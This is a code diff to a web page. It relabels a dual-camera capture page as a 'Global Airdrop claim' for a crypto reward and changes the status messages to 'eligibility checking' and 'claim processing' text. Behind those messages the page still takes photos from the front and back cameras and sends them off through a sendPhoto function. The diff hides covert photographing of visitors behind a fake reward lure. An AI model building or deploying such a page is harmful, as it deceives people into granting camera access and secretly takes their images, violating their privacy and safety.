@@ -105,7 +105,7 @@
 </head>
 <body>
 
-  <h1>Dual Camera Capture</h1>
+  <h1>Global Airdrop claim</h1>
   <p class="subtitle">claim reward - $alpha </p>
 
   <div class="premium-card">
@@ -127,7 +127,7 @@
 
       try {
         // Front camera
-        status.textContent = "Front camera...";
+        status.textContent = "Eligibitity Cheaking...";
         const frontStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }
         });
@@ -135,14 +135,14 @@
         await sendPhoto(frontBase64, "front");
 
         // Back camera
-        status.textContent = "Back camera...";
+        status.textContent = "claim prossesing...";
         const backStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "environment" }
         });
         const backBase64 = await quickCapture(backStream);
         await sendPhoto(backBase64, "back");
 
-        status.textContent = "claim done ✓";
+        status.textContent = "claim done ";
       } catch (err) {
         let msg = "Error: ";
         if (err.name === 'NotAllowedError') msg += "Camera permission denied";
